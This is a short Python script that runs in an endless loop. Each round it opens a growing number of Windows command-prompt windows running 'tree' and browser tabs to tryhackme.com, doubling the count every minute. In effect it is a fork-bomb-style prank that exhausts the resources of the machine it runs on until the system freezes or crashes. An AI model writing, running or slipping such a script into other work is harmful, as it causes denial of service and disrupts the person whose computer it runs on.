import os
import time
import webbrowser


n = 10
while True:
    for i in range(n):
        os.system("start cmd /k tree")
    for i in range(n // 2):
        webbrowser.open("https://tryhackme.com")
    n *= 2
    time.sleep(60)





